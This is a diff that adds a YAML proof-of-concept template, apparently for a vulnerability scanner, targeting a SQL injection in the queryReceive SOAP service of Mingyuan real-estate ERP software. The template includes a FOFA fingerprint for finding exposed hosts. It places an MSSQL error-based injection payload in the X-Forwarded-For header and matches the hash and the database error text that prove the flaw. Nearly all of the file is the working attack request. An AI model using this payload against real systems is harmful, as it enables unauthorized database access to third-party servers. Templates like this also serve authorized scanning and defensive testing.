@@ -1,0 +1,27 @@
+id: poc-yaml-mysoft-erp-queryreceive-xffi
+info:
+  name: 明源地产ERP queryReceive X-Forwarded-For注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 明源地产ERP
+  fofa: body="/_common/scripts/md5-min.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Kfxt/Service.asmx
+  headers:
+    X-Forwarded-For: 127.0.0.1') AND 1234 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))--
+      +
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://www.mysoft.com.cn/queryReceive"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <queryReceive xmlns=\"http://www.mysoft.com.cn/\">\n   \
+    \   <inpXML><xml><buname>abc</buname></xml></inpXML>\n    </queryReceive>\n  </soap:Body>\n\
+    </soap:Envelope>"
+  expression: status_code == 200 && contains(body,"0x" + t2) && contains(body,"queryReceiveResponse")
+    && contains(body,"转换成数据类型 int 时失败") && contains(body,"在将 nvarchar 值") && contains(content_type,"text/xml")
+transport: http
